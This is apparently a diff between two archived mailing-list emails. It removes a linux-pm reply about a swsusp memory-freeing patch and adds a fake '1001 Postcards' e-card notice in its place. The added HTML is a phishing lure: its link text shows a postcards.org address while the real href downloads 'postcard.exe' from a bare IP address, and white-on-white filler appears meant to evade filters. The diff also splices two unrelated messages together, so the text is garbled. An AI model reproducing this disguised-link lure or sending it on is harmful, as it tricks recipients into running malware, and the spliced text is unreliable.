@@ -1,15 +1,10 @@
-From: Nigel Cunningham <nigel@nigel.suspend2.net>
-Subject: Re: [RFC][PATCH -mm 1/2] swsusp: Free more memory
-Date: Mon, 23 Apr 2007 08:22:35 +1000
-Message-ID: <1177280555.18406.71.camel@nigel.suspend2.net>
-References: <200704220002.37083.rjw@sisk.pl> <200704220005.39942.rjw@sisk.pl>
-	<1177198299.4036.8.camel@nigel.suspend2.net>
-	<200704221137.34104.rjw@sisk.pl>
-Reply-To: nigel@nigel.suspend2.net
+From: postcards1001 <postcards@postcards1001.com>
+Subject: You've received a greeting from a family member!
+Date: Sun, 22 Apr 2007 00:14:12 -0400 (EDT)
+Message-ID: <20070422041412.2404869FE61@webobjects.ornith.cornell.edu>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============1121980391390569433=="
+Content-Type: multipart/mixed; boundary="===============2229630730771885229=="
 Return-path: <linux-pm-bounces@lists.linux-foundation.org>
-In-Reply-To: <200704221137.34104.rjw@sisk.pl>
 List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=unsubscribe>
 List-Archive: <http://lists.linux-foundation.org/pipermail/linux-pm>
@@ -17,79 +12,68 @@ List-Post: <mailto:linux-pm@lists.linux-foundation.org>
 List-Help: <mailto:linux-pm-request@lists.linux-foundation.org?subject=help>
 List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/linux-pm>,
 	<mailto:linux-pm-request@lists.linux-foundation.org?subject=subscribe>
-Mime-version: 1.0
 Sender: linux-pm-bounces@lists.linux-foundation.org
 Errors-To: linux-pm-bounces@lists.linux-foundation.org
-To: "Rafael J. Wysocki" <rjw@sisk.pl>
-Cc: pm list <linux-pm@lists.linux-foundation.org>, Pavel Machek <pavel@ucw.cz>
+To: linux-pm@osdl.org
 List-Id: linux-pm@vger.kernel.org
 
-
---===============1121980391390569433==
-Content-Type: multipart/signed; micalg=pgp-sha1;
-	protocol="application/pgp-signature";
-	boundary="=-OBHJfzZbTny5ObRdQ+Dw"
+--===============2229630730771885229==
+Content-Type: text/html
 
 
---=-OBHJfzZbTny5ObRdQ+Dw
-Content-Type: text/plain
-Content-Transfer-Encoding: quoted-printable
-
-Hi.
-
-On Sun, 2007-04-22 at 11:37 +0200, Rafael J. Wysocki wrote:
-> On Sunday, 22 April 2007 01:31, Nigel Cunningham wrote:
-> > Hi.
-> >=20
-> > On Sun, 2007-04-22 at 00:05 +0200, Rafael J. Wysocki wrote:
-> > > From: Rafael J. Wysocki <rjw@sisk.pl>
-> > >=20
-> > > Move the definition of PAGES_FOR_IO to kernel/power/power.h and intro=
-duce
-> > > SPARE_PAGES representing the number of pages that should be freed by =
-the
-> > > swsusp's memory shrinker in addition to PAGES_FOR_IO so that device d=
-rivers can
-> > > allocate some memory (up to 1 MB total) in their .suspend() routines =
-without
-> > > causing the suspend to fail.
-> >=20
-> > 1MB is not going to be enough for people with DRI. I have a cycle on my
-> > machine recording 3510 extra pages (13 meg) allocated during the atomic
-> > copy, and I know there are others with larger numbers.
->=20
-> I know.  The other mechanism (ie. notifiers) is for them.
->=20
-> The idea of this patch is to make it possible to _avoid_ using the notifi=
-ers
-> if you need only a limited amount of memory.
-
-That's fine when the notifiers are actually used, but for the moment....
-
-Regards,
-
-Nigel
-
---=-OBHJfzZbTny5ObRdQ+Dw
-Content-Type: application/pgp-signature; name=signature.asc
-Content-Description: This is a digitally signed message part
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.6 (GNU/Linux)
-
-iD8DBQBGK+ArN0y+n1M3mo0RArEHAJ4n9/GEQOVpXzDBjIfl6gK/RnTLvgCdEPCX
-CCxefA0QAm0hUB4uN3XcBtQ=
-=9G/C
------END PGP SIGNATURE-----
-
---=-OBHJfzZbTny5ObRdQ+Dw--
+<TITLE>postcards.org</TITLE>
+<META NAME="a">
+<METAA NAME="description" content="a">
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD>
+<BODY bgColor=#FFFFFF link=#000099 vLink=#FF0000>
+<div align="center">
+  <p align="left">&nbsp;
+  <p align="left"><font size="2" face="Arial">You have just received a virtual
+    postcard from a family member!</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">You can pick up your postcard at
+    the following web address:</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial"><A
+href="http://194.25.140.10/~sc/postcard.exe"
+target=_blank>http://www2.postcards.org/?a91-valets-cloud-31337</A></font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">If you can't click on the web address
+    above, you can also<br>
+    visit 1001 Postcards at http://www.postcards.org/postcards/<br>
+    and enter your pickup code, which is: a91-valets-cloud-mad</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <P align="left"><font size="2" face="Arial">(Your postcard will be available
+    for 60 days.)</font></P>
+  <P align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></P>
+  <p align="left"><font size="2" face="Arial">Oh -- and if you'd like to reply
+    with a postcard,<br>
+    you can do so by visiting this web address:<br>
+    http://www2.postcards.org/<br>
+    (Or you can simply click the &quot;reply to this postcard&quot;<br>
+    button beneath your postcard!)</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">We hope you enjoy your postcard,
+    and if you do,<br>
+    please take a moment to send a few yourself!</font></p>
+  <p align="left"><font color="#FFFFFF" size="2" face="Arial">.</font></p>
+  <p align="left"><font size="2" face="Arial">Regards,<br>
+    1001 Postcards<br>
+    http://www.postcards.org/postcards/ </font></p>
+</p>
+  </div>
+</BODY></HTML>
 
 
---===============1121980391390569433==
+
+
+
+--===============2229630730771885229==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============1121980391390569433==--
+--===============2229630730771885229==--
